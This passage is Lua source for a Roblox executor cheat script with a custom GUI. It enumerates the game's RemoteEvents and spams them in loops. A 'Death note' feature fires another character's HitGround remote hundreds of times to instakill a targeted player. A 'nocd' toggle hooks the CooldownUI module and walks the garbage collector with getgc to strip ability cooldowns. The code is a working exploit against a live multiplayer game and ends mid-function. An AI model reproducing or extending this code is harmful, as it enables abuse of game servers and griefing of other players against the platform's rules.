	local L = Instance.new("TextLabel")
	L.Size = UDim2.new(1, -6, 0, 22)
	L.BackgroundColor3 = Color3.fromRGB(45, 25, 70)
	L.TextColor3 = Color3.fromRGB(240, 220, 255)
	L.Font = Enum.Font.GothamBold
	L.TextSize = 11
	L.TextXAlignment = Enum.TextXAlignment.Left
	L.Text = "- " .. label
	L.Parent = Scroll
	local LC = Instance.new("UICorner")
	LC.CornerRadius = UDim.new(0, 4)
	LC.Parent = L
	local id = iconId(label)
	if id then
	local img = Instance.new("ImageLabel")
	img.Name = "CharIcon"
	img.Size = UDim2.new(0, 18, 0, 18)
	img.Position = UDim2.new(0, 2, 0.5, -9)
	img.BackgroundTransparency = 1
	img.BorderSizePixel = 0
	img.ScaleType = Enum.ScaleType.Fit
	img.ZIndex = 5
	img.Parent = L
	img.Image = "rbxassetid://" .. id
	L.Text = "       - " .. label
	end
	return L
	end
	local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if not charactersFolder then MakeButton("[ERROR] No Characters folder", function() end) return end
	for _, characterFolder in ipairs(charactersFolder:GetChildren()) do
	if characterFolder:IsA("Folder") or characterFolder:IsA("Model") then
	local charName = characterFolder.Name local remotesFolder = characterFolder:FindFirstChild("Remotes") local matchedAbilities = {}
	if remotesFolder then
	for _, remote in ipairs(remotesFolder:GetChildren()) do
	if remote:IsA("RemoteEvent") then local abilityName = remote.Name
	if searchText == "" or charName:lower():find(searchText) or abilityName:lower():find(searchText) then
	table.insert(matchedAbilities, {remote = remote, name = abilityName})
	end
	end
	end
	end
	if searchText == "" or charName:lower():find(searchText) or #matchedAbilities > 0 then
	MakeCategory(charName)
	if #matchedAbilities == 0 then MakeButton("[NO REMOTES] " .. charName, function() end)
	else for _, data in ipairs(matchedAbilities) do
	MakeButton("⚡ " .. data.name, function()
	if simultaneousEnabled then
	for i = 1, simultaneousCount do
	data.remote:FireServer()
	end
	elseif loopInterval > 0 then
	if currentLoopThread then task.cancel(currentLoopThread) currentLoopThread = nil end
	local interval = loopInterval
	currentLoopThread = task.spawn(function()
	while loopInterval > 0 do
	data.remote:FireServer()
	task.wait(interval)
	end
	end)
	else
	if currentLoopThread then task.cancel(currentLoopThread) currentLoopThread = nil end
	data.remote:FireServer()
	end
	end, charName, data.name)
	end end
	end
	end
	end
	task.wait() Scroll.CanvasSize = UDim2.new(0,0,0,List.AbsoluteContentSize.Y + 10)
end
local function AutoDetectCharacter()
	local char = LocalPlayer.Character
	if char then local charName = char.Name local charactersFolder = ReplicatedStorage:FindFirstChild("Characters")
	if charactersFolder then for _, folder in ipairs(charactersFolder:GetChildren()) do
	if folder.Name:lower() == charName:lower() then SearchBox.Text = folder.Name return end
	end end
	end
end
LocalPlayer.CharacterAdded:Connect(function(newChar)
	Character = newChar
	KickButton:SetAttribute("RumLife", false)
	if KickButton.Text == "ON" then
	KickButton.Text = "Speed Crash"
	KickButton.BackgroundColor3 = Color3.fromRGB(20, 90, 140)
	end
	task.wait(1)
	AutoDetectCharacter()
end)
SearchBox:GetPropertyChangedSignal("Text"):Connect(Refresh)
AutoDetectCharacter() Refresh()
-- Start author tag detection
startAuthorDetection()
do
	UIS.InputEnded:Connect(function(input)
	if LocalPlayer:GetAttribute("YYDSPC") ~= true then
	return
	end
	if input.KeyCode ~= Enum.KeyCode.C then
	return
	end
	if LocalPlayer:GetAttribute("YYDSStalkMode") ~= true then
	return
	end
	local fgE = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local skE = fgE and fgE:FindFirstChild("Stalk")
	if skE then
	skE:SetAttribute("Locked", false)
	end
	end)
	UIS.InputBegan:Connect(function(input, gameProcessed)
	if LocalPlayer:GetAttribute("YYDSPC") ~= true then
	return
	end
	local code = input.KeyCode
	if code == Enum.KeyCode.T then
	local fgGun = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local gunBtn = fgGun and fgGun:FindFirstChild("DeadpoolSkill")
	if gunBtn and gunBtn.Visible then
	local gArrowBtn = gunBtn:FindFirstChild("GunMArrow")
	local gBarFrame = gunBtn:FindFirstChild("GunMBar")
	if gArrowBtn and gBarFrame then
	if gBarFrame.Visible then
	gBarFrame.Visible = false
	gArrowBtn.Visible = true
	else
	gBarFrame.Visible = true
	gArrowBtn.Visible = false
	end
	end
	end
	return
	elseif code == Enum.KeyCode.Y then
	local fgGun = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local gunBtn = fgGun and fgGun:FindFirstChild("DeadpoolSkill")
	if gunBtn and gunBtn.Visible then
	local gArrowBtn = gunBtn:FindFirstChild("GunMArrow")
	local gBarFrame = gunBtn:FindFirstChild("GunMBar")
	local gSwitch = gBarFrame and gBarFrame:FindFirstChild("GunHighSwitch")
	if gSwitch and gBarFrame then
	pcall(function()
	if getconnections then
	for _, conn in ipairs(getconnections(gSwitch.MouseButton1Click)) do
	if conn.Fire then
	conn:Fire()
	break
	end
	end
	end
	end)
	gBarFrame.Visible = false
	if gArrowBtn then
	gArrowBtn.Visible = true
	end
	end
	end
	return
	end
	if code == Enum.KeyCode.R then
	local fgR = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local mmR = fgR and fgR:FindFirstChild("MMLifeInsure")
	local liR = fgR and fgR:FindFirstChild("LifeInsure")
	if (not (mmR and mmR.Visible)) and liR and liR.Visible then
	local pb = liR:FindFirstChild("LiPBar")
	local pa = liR:FindFirstChild("LiPArrow")
	local rh = liR:FindFirstChild("LiRHint")
	if pb then
	local on = not pb.Visible
	pb.Visible = on
	if pa then pa.Visible = not on end
	if rh then rh.Visible = not on end
	end
	return
	end
	end
	if gameProcessed then
	return
	end
	local btn = nil
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local mmOwn = fg and fg:FindFirstChild("MMLifeInsure")
	if mmOwn and mmOwn.Visible then
	local restricted = LocalPlayer:GetAttribute("YYDSStalkMode") == true
	local mz, mx, mt, mn, mc, mv, mcan, mnb = "Z", "X", "T", "R", "C", "V", "R", "B"
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "M:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then mz = vals[1] end
	if vals[2] then mx = vals[2] end
	if vals[3] then mt = vals[3] end
	if vals[4] then mn = vals[4] end
	if vals[5] then mc = vals[5] end
	if vals[6] then mv = vals[6] end
	if vals[7] then mcan = vals[7] end
	if vals[8] then mnb = vals[8] end
	end
	end
	end)
	local kn = string.upper(tostring(code.Name or ""))
	if kn == mz then
	local bar = mmOwn:FindFirstChild("MmBar")
	local ar = mmOwn:FindFirstChild("MmArrow")
	if bar then
	bar.Visible = not bar.Visible
	if ar then
	ar.Visible = not bar.Visible
	end
	end
	return
	elseif kn == mt then
	local bar = mmOwn:FindFirstChild("MmBar")
	local modeBtn = bar and bar:FindFirstChild("StalkModeBtn")
	if modeBtn then
	btn = modeBtn
	else
	LocalPlayer:SetAttribute("YYDSStalkMode", not restricted)
	end
	elseif kn == mx then
	btn = mmOwn
	elseif kn == mcan and restricted then
	local sk = fg:FindFirstChild("Stalk")
	local cancel = sk and sk:FindFirstChild("StalkCancel")
	if cancel and cancel.Visible then
	btn = cancel
	end
	elseif kn == mn and restricted ~= true then
	local nk = fg:FindFirstChild("NeckSnap")
	if nk and nk.Visible then
	btn = nk
	end
	elseif kn == mnb and restricted then
	local nk = fg:FindFirstChild("NeckSnap")
	if nk and nk.Visible then
	btn = nk
	end
	elseif kn == mc then
	if restricted then
	local sk = fg:FindFirstChild("Stalk")
	if sk and sk.Visible then
	sk:SetAttribute("Locked", true)
	if sk:GetAttribute("AimOn") == true then
	return
	end
	btn = sk
	end
	else
	local st = fg:FindFirstChild("MyersStab")
	if st and st.Visible then
	btn = st
	end
	end
	elseif kn == mv then
	local tb = fg:FindFirstChild("TerrorBlade")
	if tb and tb.Visible then
	btn = tb
	end
	end
	elseif fg and fg:FindFirstChild("DeadpoolSkill") and fg:FindFirstChild("DeadpoolSkill").Visible then
	local gunKey = fg:FindFirstChild("DeadpoolSkill")
	local dx, dc, dv, dr = "X", "C", "V", "R"
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "D:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then dx = vals[1] end
	if vals[2] then dc = vals[2] end
	if vals[3] then dv = vals[3] end
	if vals[4] then dr = vals[4] end
	end
	end
	end)
	local kn = string.upper(tostring(code.Name or ""))
	if kn == dx then
	btn = gunKey
	elseif kn == dc then
	local sl = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer")
	local shootKey = sl and sl:FindFirstChild("DeadpoolShoot")
	if shootKey and shootKey.Visible then
	btn = shootKey
	else
	local roarKey = fg:FindFirstChild("Roar")
	if roarKey and roarKey.Visible then
	btn = roarKey
	end
	end
	elseif kn == dv then
	local liKey = fg:FindFirstChild("LifeInsure")
	if liKey and liKey.Visible then
	btn = liKey
	end
	elseif kn == dr then
	local liKey = fg:FindFirstChild("LifeInsure")
	if liKey and liKey.Visible then
	local pb = liKey:FindFirstChild("LiPBar")
	local pa = liKey:FindFirstChild("LiPArrow")
	local rh = liKey:FindFirstChild("LiRHint")
	if pb then
	local on = not pb.Visible
	pb.Visible = on
	if pa then pa.Visible = not on end
	if rh then rh.Visible = not on end
	end
	end
	return
	end
	elseif fg and fg:FindFirstChild("LifeInsure") and fg:FindFirstChild("LifeInsure").Visible then
	local liKey = fg:FindFirstChild("LifeInsure")
	local wv, wr = "V", "R"
	if liKey:GetAttribute("IsWolverine") == true then
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "W:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then wv = vals[1] end
	if vals[2] then wr = vals[2] end
	end
	end
	end)
	end
	local kn = string.upper(tostring(code.Name or ""))
	if kn == wv then
	btn = liKey
	elseif liKey:GetAttribute("IsWolverine") ~= true and code == Enum.KeyCode.C then
	local roarKey = fg:FindFirstChild("Roar")
	if roarKey and roarKey.Visible then
	btn = roarKey
	end
	elseif kn == wr then
	local pb = liKey:FindFirstChild("LiPBar")
	local pa = liKey:FindFirstChild("LiPArrow")
	local rh = liKey:FindFirstChild("LiRHint")
	if pb then
	local on = not pb.Visible
	pb.Visible = on
	if pa then pa.Visible = not on end
	if rh then rh.Visible = not on end
	end
	return
	end
	elseif kiraAim and KiraAimButton then
	local kv, kz, kx, kc, kr = "V", "Z", "X", "C", "R"
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "K:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then kv = vals[1] end
	if vals[2] then kz = vals[2] end
	if vals[3] then kx = vals[3] end
	if vals[4] then kc = vals[4] end
	if vals[5] then kr = vals[5] end
	end
	end
	end)
	local kn = string.upper(tostring(code.Name or ""))
	if kn == kv then
	btn = KiraAimButton
	elseif kn == kc then
	btn = KiraAimButton:FindFirstChild("KiraArrow", true)
	elseif kn == kz then
	btn = KiraAimButton:FindFirstChild("KiraInsta", true)
	elseif kn == kx then
	btn = KiraAimButton:FindFirstChild("KiraDelay", true)
	elseif kn == kr then
	btn = cancelButton
	end
	elseif aTrainModActive then
	local ax, ac, av, ar, af = "X", "C", "V", "R", "X"
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "A:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then ax = vals[1] end
	if vals[2] then ac = vals[2] end
	if vals[3] then av = vals[3] end
	if vals[4] then ar = vals[4] end
	if vals[5] then af = vals[5] end
	end
	end
	end)
	local kn = string.upper(tostring(code.Name or ""))
	if kn == ax then
	btn = FlashstrikeButton
	elseif kn == ac then
	btn = MoAimButton
	elseif kn == av then
	btn = KickButton
	elseif kn == ar then
	btn = cancelButton
	elseif kn == af then
	local finK = FloatingGui:FindFirstChild("ATrainFinish")
	if finK and finK.Visible then
	btn = finK
	end
	end
	elseif homelanderModActive then
	local hz, hx, hc, hv, hb = "Z", "X", "C", "V", "B"
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "H:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then hz = vals[1] end
	if vals[2] then hx = vals[2] end
	if vals[3] then hc = vals[3] end
	if vals[4] then hv = vals[4] end
	if vals[5] then hb = vals[5] end
	end
	end
	end)
	local kn = string.upper(tostring(code.Name or ""))
	if kn == hz then
	local fl = fg and fg:FindFirstChild("HomeExtra")
	if fl then
	btn = fl
	end
	elseif kn == hx then
	btn = FlashstrikeButton
	elseif kn == hc then
	btn = LaserButton
	elseif kn == hv then
	local ev = KickButton:FindFirstChild("PunchGo")
	if ev then
	ev:Fire()
	end
	return
	elseif kn == hb then
	btn = UpthrowButton
	end
	end
	if btn and btn.Visible then
	pcall(function()
	if getconnections then
	for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do
	if conn.Fire then
	conn:Fire()
	break
	end
	end
	end
	end)
	end
	end)
end
print("Script loaded. Release (no Blink). Author: happyYYDS1314.")
kiraAim = false
kiraKillMode = "insta"
KiraAimButton = nil
KiraModBtn.MouseButton1Click:Connect(function()
	if kiraAim then
	kiraAim = false
	KiraModBtn.Text = "Kira"
	KiraModBtn.BackgroundColor3 = Color3.fromRGB(138, 149, 165)
	if aimModeActive then exitAimMode() end
	if KiraAimButton then KiraAimButton.Visible = false end
	local stK = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stK = stK and stK:FindFirstChild("Stalk")
	if stK then stK.Visible = false end
	local stKm = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stKm = stKm and stKm:FindFirstChild("MMLifeInsure")
	if stKm then
	stKm.Visible = false
	local stKb = stKm:FindFirstChild("MmBar")
	if stKb then stKb.Visible = false end
	end
	return
	end
	kiraAim = true
	do
	local hb = Page2Scroll:FindFirstChild("HealRegenModBtn")
	if hb then
	hb:SetAttribute("On", false)
	hb.Text = "X-Regen"
	hb.BackgroundColor3 = Color3.fromRGB(38, 40, 42)
	hb.Size = UDim2.new(1, -62, 0, 24)
	hb.Position = UDim2.new(0, 57, 0, 144)
	local dip = hb:FindFirstChild("DeadpoolPic")
	if dip then dip.Visible = false end
	end
	local wv = Page2Scroll:FindFirstChild("XRegenWolverineBtn")
	if wv then wv.Visible = false end
	local sa = Page2Scroll:FindFirstChild("XRegenSkinArrow")
	if sa then sa.Visible = false end
	local sp = Page2Scroll:FindFirstChild("XRegenSkinPage")
	if sp then sp.Visible = false end
	local mpMore = Page2Scroll:FindFirstChild("XRegenMorePage")
	if mpMore then mpMore.Visible = false end
	local mbMore = Page2Scroll:FindFirstChild("XRegenMoreBtn")
	if mbMore then mbMore.Visible = true end
	local p1 = Page2Scroll:FindFirstChild("XRegenPic1")
	if p1 then p1.Visible = true end
	local p2 = Page2Scroll:FindFirstChild("XRegenPic2")
	if p2 then p2.Visible = true end
	local fgX = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local liX = fgX and fgX:FindFirstChild("LifeInsure")
	if liX then
	liX.Visible = false
	liX:SetAttribute("On", false)
	local kX = liX:FindFirstChild("Knob")
	local nX = liX:FindFirstChild("NameLab")
	if nX then nX.Visible = true end
	if kX then
	kX.Visible = false
	kX.Position = UDim2.new(0, 4, 0.5, -9)
	kX.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
	end
	end
	local roarX = fgX and fgX:FindFirstChild("Roar")
	if roarX then roarX.Visible = false end
	local gunX = fgX and fgX:FindFirstChild("DeadpoolSkill")
	if gunX then gunX.Visible = false end
	local shX = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer") and LocalPlayer.PlayerGui.DracoHubShootLayer:FindFirstChild("DeadpoolShoot")
	if shX then shX.Visible = false end
	end
	do
	local fgH = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	if fgH then
	for _, nm in ipairs({"Stalk", "MMLifeInsure", "NeckSnap", "MyersStab", "TerrorBlade"}) do
	local b = fgH:FindFirstChild(nm)
	if b then
	b.Visible = false
	local mb = b:FindFirstChild("MmBar")
	if mb then mb.Visible = false end
	end
	end
	local ex = fgH:FindFirstChild("HomeExtra")
	if ex then ex.Visible = false end
	end
	end
	homelanderModActive = false
	aTrainModActive = false
	updateHomelanderModButton()
	updateATrainModButton()
	if FinisherButton then FinisherButton.Visible = false end
	LaserButton.Visible = false
	UpthrowButton.Visible = false
	FlashstrikeButton.Visible = false
	KickButton.Visible = false
	MoAimButton.Visible = false
	do
	local fin = FloatingGui:FindFirstChild("ATrainFinish")
	if not fin then
	local fgF = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	fin = fgF and fgF:FindFirstChild("ATrainFinish")
	end
	if fin then fin.Visible = false end
	end
	local stO = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stO = stO and stO:FindFirstChild("Stalk")
	if stO then stO.Visible = false end
	local stOm = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	stOm = stOm and stOm:FindFirstChild("MMLifeInsure")
	if stOm then
	stOm.Visible = false
	local stOb = stOm:FindFirstChild("MmBar")
	if stOb then stOb.Visible = false end
	end
	KiraModBtn.Text = "Cancel Kira"
	KiraModBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
	if not KiraAimButton then
	KiraAimButton = Instance.new("TextButton")
	KiraAimButton.Name = "DeathNote"
	KiraAimButton.Size = UDim2.new(0, 60, 0, 60)
	KiraAimButton.Position = DEFAULT_POSITIONS.MoAim
	KiraAimButton.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
	KiraAimButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	KiraAimButton.Font = Enum.Font.GothamBold
	KiraAimButton.Text = "Death note"
	KiraAimButton.TextScaled = true
	KiraAimButton.TextWrapped = true
	KiraAimButton.TextSize = 11
	KiraAimButton.Visible = true
	KiraAimButton.Parent = FloatingGui
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 8)
	c.Parent = KiraAimButton
	local arrowBtn = Instance.new("TextButton")
	arrowBtn.Name = "KiraArrow"
	arrowBtn.Size = UDim2.new(1, 0, 0, 16)
	arrowBtn.Position = UDim2.new(0, 0, 0, -18)
	arrowBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	arrowBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
	arrowBtn.Font = Enum.Font.GothamBold
	arrowBtn.TextSize = 12
	arrowBtn.Text = "^"
	arrowBtn.Parent = KiraAimButton
	local ac = Instance.new("UICorner")
	ac.CornerRadius = UDim.new(0, 4)
	ac.Parent = arrowBtn
	local modeBar = Instance.new("Frame")
	modeBar.Size = UDim2.new(0, 168, 0, 22)
	modeBar.Position = UDim2.new(0.5, -84, 0, -42)
	modeBar.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	modeBar.Visible = false
	modeBar.Parent = KiraAimButton
	local mc = Instance.new("UICorner")
	mc.CornerRadius = UDim.new(0, 4)
	mc.Parent = modeBar
	local instaBtn = Instance.new("TextButton")
	instaBtn.Name = "KiraInsta"
	instaBtn.Size = UDim2.new(0.5, -3, 1, -4)
	instaBtn.Position = UDim2.new(0, 2, 0, 2)
	instaBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	instaBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	instaBtn.Font = Enum.Font.GothamBold
	instaBtn.TextSize = 9
	instaBtn.Text = "Instakill"
	instaBtn.Parent = modeBar
	local ic = Instance.new("UICorner")
	ic.CornerRadius = UDim.new(0, 3)
	ic.Parent = instaBtn
	local delayBtn = Instance.new("TextButton")
	delayBtn.Name = "KiraDelay"
	delayBtn.Size = UDim2.new(0.5, -3, 1, -4)
	delayBtn.Position = UDim2.new(0.5, 1, 0, 2)
	delayBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	delayBtn.TextColor3 = Color3.fromRGB(210, 210, 210)
	delayBtn.Font = Enum.Font.Gotham
	delayBtn.TextSize = 9
	delayBtn.Text = "Delayed kill"
	delayBtn.Parent = modeBar
	local dc = Instance.new("UICorner")
	dc.CornerRadius = UDim.new(0, 3)
	dc.Parent = delayBtn
	local function paintMode()
	if kiraKillMode == "delay" then
	delayBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	delayBtn.Font = Enum.Font.GothamBold
	instaBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	instaBtn.Font = Enum.Font.Gotham
	else
	instaBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	instaBtn.Font = Enum.Font.GothamBold
	delayBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	delayBtn.Font = Enum.Font.Gotham
	end
	end
	paintMode()
	arrowBtn.MouseButton1Click:Connect(function()
	modeBar.Visible = not modeBar.Visible
	end)
	instaBtn.MouseButton1Click:Connect(function()
	kiraKillMode = "insta"
	paintMode()
	modeBar.Visible = false
	end)
	delayBtn.MouseButton1Click:Connect(function()
	kiraKillMode = "delay"
	paintMode()
	modeBar.Visible = false
	end)
	local show = LocalPlayer:GetAttribute("YYDSPC") == true
	local v = Instance.new("TextLabel")
	v.Name = "PcHint"
	v.Size = UDim2.new(1, 0, 0, 12)
	v.Position = UDim2.new(0, 0, 1, -6)
	v.BackgroundTransparency = 1
	v.Font = Enum.Font.GothamBold
	v.TextSize = 11
	v.TextColor3 = Color3.fromRGB(230, 230, 230)
	v.Text = "V"
	v.Visible = show
	v.Parent = KiraAimButton
	local cl = Instance.new("TextLabel")
	cl.Name = "PcHint"
	cl.Size = UDim2.new(0, 12, 0, 12)
	cl.Position = UDim2.new(1, 2, 0.5, -6)
	cl.BackgroundTransparency = 1
	cl.Font = Enum.Font.GothamBold
	cl.TextSize = 11
	cl.TextColor3 = Color3.fromRGB(230, 230, 230)
	cl.Text = "C"
	cl.Visible = show
	cl.Parent = arrowBtn
	local zl = Instance.new("TextLabel")
	zl.Name = "PcHint"
	zl.Size = UDim2.new(1, 0, 0, 12)
	zl.Position = UDim2.new(0, 0, 1, -2)
	zl.BackgroundTransparency = 1
	zl.Font = Enum.Font.GothamBold
	zl.TextSize = 10
	zl.TextColor3 = Color3.fromRGB(230, 230, 230)
	zl.Text = "Z"
	zl.Visible = show
	zl.Parent = instaBtn
	local xl = Instance.new("TextLabel")
	xl.Name = "PcHint"
	xl.Size = UDim2.new(1, 0, 0, 12)
	xl.Position = UDim2.new(0, 0, 1, -2)
	xl.BackgroundTransparency = 1
	xl.Font = Enum.Font.GothamBold
	xl.TextSize = 10
	xl.TextColor3 = Color3.fromRGB(230, 230, 230)
	xl.Text = "X"
	xl.Visible = show
	xl.Parent = delayBtn
	setupDrag(KiraAimButton)
	KiraAimButton.MouseButton1Click:Connect(function()
	if moveUnlocked then return end
	if isExecuting then return end
	if aimModeActive then
	local t = aimTarget
	if not t then
	t = getPlayerFromScreenCenter()
	end
	local remote = ReplicatedStorage.Characters.Homelander.Remotes.HitGround
	local shotHit = nil
	local cfShot = ReplicatedStorage:FindFirstChild("Characters")
	if cfShot then
	local folder = cfShot:FindFirstChild("SCPGuard")
	if folder then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	shotHit = remotesFolder:FindFirstChild("ShotgunHit")
	end
	end
	end
	if remote and t then
	do
	local chMe = LocalPlayer.Character
	local humMe = chMe and chMe:FindFirstChildOfClass("Humanoid")
	local an = humMe and humMe:FindFirstChildOfClass("Animator")
	if an then
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://133906083230563"
	local ok, tr = pcall(function()
	return an:LoadAnimation(a)
	end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr.Looped = false
	tr:Play()
	end
	end
	end
	if kiraKillMode ~= "delay" then
	task.spawn(function()
	local marked = t
	local ch0 = marked.Character
	if ch0 then
	for _ = 1, 500 do
	remote:FireServer(marked.DisplayName)
	remote:FireServer(marked.Name)
	remote:FireServer(ch0)
	end
	end
	local endTime = tick() + 20
	while tick() < endTime do
	local ch = marked.Character
	if not ch then
	break
	end
	local hum = ch:FindFirstChildOfClass("Humanoid")
	if (not hum) or hum.Health <= 0 then
	break
	end
	remote:FireServer(marked.DisplayName)
	remote:FireServer(marked.Name)
	remote:FireServer(ch)
	task.wait(0.05)
	end
	end)
	else
	task.spawn(function()
	local marked = t
	local remote2 = ReplicatedStorage.Characters.Homelander.Remotes.HitGround
	remote2:FireServer(marked.DisplayName)
	remote2:FireServer(marked.Name)
	remote2:FireServer(marked.Character)
	while true do
	task.wait(2)
	local ch = marked.Character
	if not ch then
	break
	end
	local hum = ch:FindFirstChildOfClass("Humanoid")
	if (not hum) or hum.Health <= 0 then
	break
	end
	remote2:FireServer(marked.DisplayName)
	remote2:FireServer(marked.Name)
	remote2:FireServer(ch)
	end
	end)
	end
	end
	exitAimMode()
	else
	aimSource = "kira"
	aimColor = Color3.fromRGB(139, 0, 0)
	enterAimMode()
	end
	end)
	end
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	KiraAimButton.Size = UDim2.new(0, 44, 0, 44)
	KiraAimButton.Position = UDim2.new(0.5, -140, 1, -96)
	end
	KiraAimButton.Text = "Death note"
	KiraAimButton.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
	KiraAimButton.Visible = true
	do
	local kv, kz, kx, kc, kr = "V", "Z", "X", "C", "R"
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "K:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then kv = vals[1] end
	if vals[2] then kz = vals[2] end
	if vals[3] then kx = vals[3] end
	if vals[4] then kc = vals[4] end
	if vals[5] then kr = vals[5] end
	end
	end
	end)
	local hintV = KiraAimButton:FindFirstChild("PcHint")
	if hintV then hintV.Text = kv end
	local arrowBtn = KiraAimButton:FindFirstChild("KiraArrow")
	local hintC = arrowBtn and arrowBtn:FindFirstChild("PcHint")
	if hintC then hintC.Text = kc end
	local instaBtn = KiraAimButton:FindFirstChild("KiraInsta", true)
	local hintZ = instaBtn and instaBtn:FindFirstChild("PcHint")
	if hintZ then hintZ.Text = kz end
	local delayBtn = KiraAimButton:FindFirstChild("KiraDelay", true)
	local hintX = delayBtn and delayBtn:FindFirstChild("PcHint")
	if hintX then hintX.Text = kx end
	end
end)
task.spawn(function()
	do
	local nocdOn = false
	local nocdHooked = false
	local nocdOldStart = nil
	local nocdUI = nil
	local nocdLoop = nil
	local nocdChar = nil
	local nocdCached = {}
	local nocdTargets = {
	MoveOne = true,
	MoveTwoGround = true,
	MoveTwoLeap = true,
	MoveThree = true,
	MoveFourBase = true,
	MoveFourAwakenMove = true,
	MoveFive = true
	}
	local nocdBtn = Instance.new("TextButton")
	nocdBtn.Name = "NocdBtn"
	nocdBtn.Size = UDim2.new(0.333, -4, 0, 18)
	nocdBtn.Position = UDim2.new(0.333, 2, 0, 1)
	nocdBtn.BackgroundColor3 = Color3.fromRGB(153, 153, 153)
	nocdBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	nocdBtn.Font = Enum.Font.GothamBold
	nocdBtn.TextSize = 10
	nocdBtn.Text = "nocd"
	nocdBtn.Parent = ModeContainer
	local nocdCorner = Instance.new("UICorner")
	nocdCorner.CornerRadius = UDim.new(0, 4)
	nocdCorner.Parent = nocdBtn
	nocdBtn.MouseButton1Click:Connect(function()
	nocdOn = not nocdOn
	if nocdOn then
	nocdBtn.Text = "ON"
	nocdBtn.BackgroundColor3 = Color3.fromRGB(90, 160, 90)
	if not nocdHooked then
	local ok, ui = pcall(function()
	local system = ReplicatedStorage:FindFirstChild("System")
	if not system then
	return nil
	end
	local mod = system:FindFirstChild("CooldownUI")
	if not mod then
	return nil
	end
	return require(mod)
	end)
	if ok and type(ui) == "table" and type(ui.Start) == "function" then
	nocdUI = ui
	nocdOldStart = ui.Start
	ui.Start = function(data)
	if nocdOn and type(data) == "table" then
	if data.Duration then
	data.Duration = 0
	end
	if data.OnFinished then
	task.spawn(data.OnFinished)
	end
	end
	return nocdOldStart(data)
	end
	nocdHooked = true
	end
	end
	nocdCached = {}
	if typeof(getgc) == "function" then
	for _, func in pairs(getgc(true)) do
	if type(func) == "function" and islclosure(func) then
	local info = debug.getinfo(func)
	if info and info.name and nocdTargets[info.name] then
